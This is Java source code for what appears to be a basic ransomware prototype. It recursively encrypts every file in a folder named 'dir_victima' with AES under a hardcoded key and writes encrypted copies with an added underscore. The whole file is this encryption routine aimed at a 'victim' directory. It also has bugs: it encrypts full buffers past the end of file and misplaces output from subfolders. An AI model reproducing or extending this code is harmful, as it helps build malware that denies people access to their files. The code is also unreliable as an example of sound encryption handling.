package main;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class Main {
	
	private static Cipher cipher;
	private static String victimDir = "dir_victima";
	
	public static void main(String args[]){
		try {
			String algorithm = "AES";
			byte[] clave = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
			SecretKey secretKey = new SecretKeySpec(clave, algorithm);
			cipher = Cipher.getInstance(algorithm);
			int mode = Cipher.ENCRYPT_MODE;
			cipher.init(mode, secretKey);
			
			cifrar(new File(victimDir));
		} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	private static void cifrar(File archivo){
		if(archivo.isDirectory()) {
			File archivos[] = archivo.listFiles();
			for(File a : archivos){
				cifrar(a);
			}
		} else {
			try {
				System.out.println(archivo.getName());
				FileInputStream fis = new FileInputStream(archivo);
				int readBytes;
				FileOutputStream fos = new FileOutputStream(new File(victimDir + "/" + archivo.getName() + "_"));
				do {
					byte[] bytes = new byte[512];
					readBytes = fis.read(bytes);
					byte[] cipheredBytes = cipher.doFinal(bytes);
					fos.write(cipheredBytes);
				} while(readBytes > 0);
				fis.close();
				fos.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalBlockSizeException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (BadPaddingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
